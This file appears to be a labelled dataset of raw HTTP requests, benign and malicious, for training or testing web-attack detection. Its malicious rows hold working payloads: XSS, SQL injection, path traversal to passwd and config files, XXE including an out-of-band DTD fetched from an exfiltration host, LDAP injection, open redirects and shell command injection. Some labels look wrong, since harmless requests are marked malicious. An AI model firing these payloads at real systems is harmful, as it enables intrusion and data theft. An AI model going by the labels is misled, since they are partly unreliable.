label,text
benign,"GET /blog/posts/2024/06/15/advancements-in-ai HTTP/1.1
Host: insight-tech-blog.org
Accept-Encoding: gzip, deflate
Cookie: blog_sid=db98394a2df79619; visitor_token=7c467ab39124; analytics_sid=6582b7df
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /news/today?utm_campaign=springlaunch&utm_medium=social_media HTTP/1.1
Host: metropolitan-newsroom.ai
Accept: text/html
Accept-Language: en-US,en;q=0.5
Referer: https://twitter.com/metropolitannews
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/113.0
Connection: keep-alive"
benign,"GET /blog/article/view/7828 HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
DNT: 1
User-Agent: Mozilla/5.0 (iPod touch; CPU iPhone OS 12_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"
benign,"GET /api/v2/orders HTTP/1.1
Host: logistics-streamline.io
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.exampletoken
Connection: keep-alive"
malicious,"GET /app/search?search=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: api.cloud-data-services.ai
Connection: close
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://api.cloud-data-services.ai/app/home
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
benign,"GET /api/status HTTP/1.1
Host: payment-gateway-core.ecommerce-platform.tech
User-Agent: Wget/1.21.3 (linux-gnu)
Accept: */*
Connection: close"
benign,"PUT /assets/theme_v3/img/banner-mobile.svg.base64 HTTP/1.1
Host: static-delivery-service.net
Content-Type: application/octet-stream
Content-Length: 78
Cookie: session_id=6e1b2a08d9d144299c7b72bf1cf2f945; lang=en-US
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Cache-Control: no-cache

PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnPg0KICA8Y2lyY2xlIGN4
PSIxMCIgY3k9IjEwIiByPSI4IiBmaWxsPSIjZmY4MDAwIi8+DQo8L3N2Zz4="
benign,"GET /shop/winter-collection/items?ref=holiday_promo HTTP/1.1
Host: online-retail-store.biz
Accept: text/html
Referer: https://email-campaign.online-retail-store.biz/winter-sale
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
malicious,"GET /thread/view/31' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e,(SELECT @@GLOBAL.sql_mode),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --/comments HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/thread/list
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
benign,"GET /api/fetchMetadata?url=https%3A%2F%2Fblog.oceanic-ventures.ai%2Fpost%2F5678 HTTP/1.1
Host: api.oceanic-ventures.ai
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Connection: keep-alive
Accept-Encoding: gzip, deflate
Referer: https://oceanic-ventures.ai/home"
malicious,"POST /newsletter/subscribe HTTP/1.1
Host: marketing-content-network.ai
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Type: application/x-www-form-urlencoded
Referer: https://exclusive.partner-newsletter.info/welcome
Content-Length: 27
Cookie: sessid=a47cde1087c53f23cd8a58266e9f4122

email=engageduser%40mailservice.dev"
benign,"GET /dashboard/view?id=1024&sort=recent&filter=active HTTP/1.1
Host: portal-analytics-server.io
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://portal-analytics-server.io/dashboard/home
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
benign,"POST /contact/form HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 86
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.146 Safari/537.36
Accept: text/html,application/xhtml+xml
Referer: https://online-retail-store.biz/contact
Connection: keep-alive

message=Our+system+needs+to+UPDATE+stock+levels+FROM+the+warehouse+database+every+hour."
benign,"GET /news/space-exploration-updates HTTP/1.1
Host: astro-watch.online
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,text/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"GET /resources/images/..%2F..%2F..%2F..%2Fvar/www/html/config.php HTTP/1.1
Host: static-uploads-files.filedropzone.us
User-Agent: Python-urllib/3.9
Accept: */*
Referer: https://static-uploads-files.filedropzone.us/gallery
Connection: close"
benign,"GET /articles/2024/04/eco-friendly-designs-in-urban-spaces HTTP/1.1
Host: urban-living-digest.biz
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.8
Referer: https://urban-living-digest.biz/category/environment
Accept-Language: en-GB,en;q=0.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
benign,"POST /submit/form HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/xml
Content-Length: 188
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: application/xml, application/xhtml+xml, application/xml;q=0.9
Referer: https://online-retail-store.biz/promo
Connection: close

<formSubmission><customer><id>45123</id><email>marco.palmer@retailstore.biz</email></customer><survey><question id=""1"">Yes</question><question id=""2"">No</question></survey></formSubmission>"
benign,"PUT /api/v1/devices/284730 HTTP/1.1
Host: iot-central-hub.ai
Authorization: Bearer hG39ds7fhd8DHKg73jsKhd9s8dF59kd7
Content-Type: application/xml
Accept: application/xml
X-Forwarded-For: 192.168.1.57
User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)
Content-Length: 171
Connection: keep-alive

<device><id>284730</id><name>Thermostat-X</name><status>active</status><temperatureUnit>Celsius</temperatureUnit></device>"
malicious,"POST /api/importConfiguration HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: br, gzip, deflate
Referer: https://community.game-dev-forum.org/upload
Content-Type: multipart/form-data; boundary=----FormBoundaryABC456
Content-Length: 489
Connection: keep-alive

------FormBoundaryABC456
Content-Disposition: form-data; name=""notes""

Initial import with config file
------FormBoundaryABC456
Content-Disposition: form-data; name=""xmlfile""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------FormBoundaryABC456--"
benign,"GET /recipes?q=how%20to%20bake%20bread HTTP/1.1
Host: seasoned-chef-guides.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Referer: https://seasoned-chef-guides.info/
Connection: keep-alive
X-Forwarded-For: 198.51.100.22"
benign,"POST /account/settings/update HTTP/1.1
Host: user-preferences-hub.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Origin: https://user-preferences-hub.org
Connection: keep-alive

name=Jane%20Doe&email=jane.doe%40mail-service.net&bio=Love%20coding%20%26%20design%23Fun%21&newsletter=yes"
benign,"GET /api/v4/user/profile?user_id=7890&callback=processData HTTP/1.1
Host: data-insights-platform.net
Connection: keep-alive
Accept: application/javascript, application/json
Referer: https://dashboard.data-insights-platform.net/report/overview
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
benign,"GET /home HTTP/1.1
Host: the-cultural-chronicle.com
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://the-cultural-chronicle.com/news/arts
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15"
benign,"POST /poll/87/vote HTTP/1.1
Host: civic-engage-platform.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://civic-engage-platform.net/poll/87
Cookie: sessionid=ghd84kdkse92jwpv34mb5cfkoq

poll_id=87&choice_id=3"
malicious,"POST /xmlapi/v2/submit HTTP/1.1
Host: secure-api.enterprise-cloud-services.net
User-Agent: Python-urllib/3.9
Content-Type: application/xml
Accept-Encoding: gzip, deflate, br
Accept: application/xml
Content-Length: 267

<!DOCTYPE request [
<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % dtd SYSTEM ""http://payload-exfil.my-secure-storage.ai/exfil.dtd"">
%dtd;
%send;
]>
<request><param>value</param></request>"
benign,"POST /api/v1/payment/process HTTP/1.1
Host: online-billing-system.info
Content-Type: application/xml
Content-Length: 108
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36
Accept: application/xml
Connection: keep-alive
Origin: https://secure-portal.online-billing-system.info

<payment><account>98231745</account><method>credit_card</method><amount>159.99</amount></payment>"
benign,"GET /mobile/articles/latest-updates?lang=en-US HTTP/1.1
Host: insights-techmedia-portal.ai
User-Agent: Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QQ3A.200805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"POST /search HTTP/1.1
Host: identity-access-management.registry-cloud.io
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Length: 66
Cache-Control: no-cache

user_id=auditor%29%28objectClass%3D*%29&attributes=%2A"
benign,"PUT /api/devices/1809 HTTP/1.1
Host: iot-management-platform.cloud
Authorization: Bearer token_67go89lkh3nkjdh7fvd9823jf
Content-Type: application/json
Accept: application/json
User-Agent: Python-urllib/3.11
Connection: close
Content-Length: 140

{""deviceId"":1809,""name"":""Weather Sensor Alpha"",""location"":""Greenhouse 5"",""status"":""active"",""metrics"":{""temperature"":24.3,""humidity"":39}}"
benign,"GET /assets/webfonts/league-gothic-regular.ttf HTTP/1.1
Host: eco-tourism-network.net
Accept: application/font-ttf,font/ttf,*/*;q=0.6
Referer: https://eco-tourism-network.net/static/css/main.css
Origin: https://eco-tourism-network.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Connection: keep-alive"
benign,"GET /products/electronics/tv/details?id=93211&ref=homepage HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://online-retail-store.biz/electronics/tv/
Cookie: user_pref=lang=en; cartID=48b3749867ef9a2a
DNT: 1
Sec-CH-UA: ""Firefox"";v=""113"", ""Mozilla"";v=""5"", ""Gecko"";v=""20100101""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
X-Requested-With: XMLHttpRequest
Pragma: no-cache
Via: 2.0 varnish"
malicious,"GET /oauth/authorize?redirect_uri=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://api.cloud-data-services.ai/docs
Connection: close"
malicious,"POST /api/v1/user/redirect HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Referer: https://www.online-retail-store.biz
Content-Length: 59

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"POST /account/update-profile HTTP/1.1
Host: user-portal-pro.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Accept: text/html,application/xhtml+xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive
Origin: https://user-portal-pro.io
Referer: https://user-portal-pro.io/account/settings

first_name=Alice&last_name=&email=alice.wong%40email.net"
benign,"GET /articles/%D1%96%D0%BD%D1%82%D0%B5%D1%80%D0%B2%D1%96%D1%8E HTTP/1.1
Host: tech-insights-ua.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: uk-UA,uk;q=0.9,en-US;q=0.7,en;q=0.5
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Connection: keep-alive"
benign,"HEAD /products/electronics/audio/headphones/model-XY900 HTTP/1.1
Host: prime-electro-shop.com
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: text/html
Referer: https://prime-electro-shop.com/products/electronics/audio/
Connection: keep-alive"
benign,"POST /submit/comment HTTP/1.1
Host: feedback.live-events-hub.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 136
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

username=concert_fan87&comment=%3Creview%3E%3Crating%3E5%3C%2Frating%3E%3Ctext%3EGreat%20show!%20Loved%20the%20lighting%20effects.%3C%2Ftext%3E%3C%2Freview%3E"
malicious,"GET /login?next=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://secure-user-portal.net/home
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: */*
Content-Type: text/plain
Content-Length: 23

Metadata for post updated."
benign,"POST /csvupload HTTP/1.1
Host: nextgen-healthcare-services.us
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Content-Type: text/csv
Content-Length: 107
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://nextgen-healthcare-services.us/patientportal

PatientID,Name,AppointmentDate,Doctor
2401,Emily Waters,2024-06-14,Dr. Jones
2402,Samuel Green,2024-06-15,Dr. Patel
2403,Jessica Tang,2024-06-16,Dr. Lee"
benign,"GET /posts-sitemap.xml HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: text/xml,application/xml
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"POST /api/notifications/mark-read HTTP/1.1
Host: push-notify-system.org
Connection: keep-alive
Content-Type: application/json
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://push-notify-system.org/notifications
Cookie: session_token=3b6f9ac4f1df2e8fd170bfc913bb5c71
Content-Length: 44

{""notificationIds"":[4471,4490,4499],""markAll"":false}"
malicious,"GET /health/check/ip-10-10-10-10%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: data-sync-service.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml
Upgrade-Insecure-Requests: 1
Cache-Control: no-cache"
benign,"GET /blog/article/view/123 HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: blog_session=173f8d0321e7f395; visitor_id=U56473829; newsletter_optin=true
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Connection: keep-alive"
benign,"GET /ping HTTP/1.1
Host: telemetry-collector.iotnetworks.tech
User-Agent: DataDog-Agent/7.41.1 (linux)
Accept: */*
Connection: close"
benign,"POST /account/auth HTTP/1.1
Host: fastuser-authenticator.biz
Content-Type: application/json
Accept: application/json
Origin: https://fastuser-authenticator.biz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYmVuIn0.dVfN8wX0UeHkEM2y028fIUqs4JXsrX3VxVXI45eAeGg
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Length: 77

{""username"":""benjamin.thorpe"",""password"":""B3njT!HelpMe""}"
benign,"POST /account/update-info HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
Cookie: session_id=59f4dc9e8a80c8a1bf3f1d32

first_name=Michael&last_name=&phone_number=+14151234567"
malicious,"GET /profile/view?id=112233 HTTP/1.1
Host: staging.nextgen-ware.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Pragma: no-cache
Cache-Control: no-cache"
malicious,"POST /user/profile/update HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Origin: https://my-personal-blog-site.info

bio=Enthusiast%20coder%0apwd%0als%20-la%20%2Fvar%2Ftmp%0a"
benign,"GET /events/list?note=param=Hello%252520World&date=2024-06-20 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /api/v7/products/electronics/64bfa12e HTTP/1.1
Host: shop-api.online-retail.biz
Accept: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIyMDE4MTIzNDU2In0.zqAiB3T-D3uOM-d4tvA7lm5GPLNngZrXMfaOjLcyDag
User-Agent: curl/7.82.0
Accept-Encoding: gzip
Connection: close"
benign,"HEAD /index.html HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Cache-Control: max-age=0
Connection: keep-alive
Referer: https://community.game-dev-forum.org/home"
malicious,"GET /downloads/images/%2E%2E%2F%2E%2E%2F%2E%2E/passwd HTTP/1.1
Host: media-digital-archive.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive
Referer: https://media-digital-archive.ai/gallery/latest"
malicious,"POST /api/importConfiguration HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://secure-user-portal.net/dashboard
Origin: https://secure-user-portal.net
Cache-Control: no-cache
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 458
Connection: keep-alive

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""uploadType""

full
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""configFile""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------WebKitFormBoundary7MA4YWxkTrZu0gW--"
benign,"GET /user/uploads/2024/06/15/image_webp HTTP/1.1
Host: community.forum-platform.net
Accept: image/avif,image/webp,*/*
Referer: https://community.forum-platform.net/home
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"PUT /api/v1/accounts/notifications/settings HTTP/1.1
Host: secure-user-portal.net
If-Match: ""5f47ac9d2f9e3c7db6a1""
Content-Type: application/json
X-CSRF-Token: 3b1f8e9a-4d2c-472d-b05f-9d859012a853
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Length: 80
Connection: keep-alive

{""emailAlerts"":true,""smsAlerts"":false,""pushNotifications"":true,""dailySummary"":false}"
benign,"GET /download/reports/monthly?file=%4a%5b%6C%7d HTTP/1.1
Host: reports.enterprise-solutions.co
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/pdf,application/msword
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=600
Connection: keep-alive"
benign,"POST /api/v1/auth/login HTTP/1.1
Host: portal-data-secure.net
Content-Type: application/json
Accept: application/json
Origin: https://portal-data-secure.net
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 70

{""username"":""brendan.carroll"",""password"":""Mild4morning!""}"
benign,"GET /products/electronics/cameras HTTP/1.1
Host: best-buy-online.biz
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Referer: https://best-buy-online.biz/
Cookie: cart_id=7f9b0c3a-12a4-4dd6-84d7-abbcd1ffe92a; last_visited=2024-06-10T14%3A22%3A17Z
DNT: 1
Sec-CH-UA: ""Chromium"";v=""114"", ""Google Chrome"";v=""114"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android"""
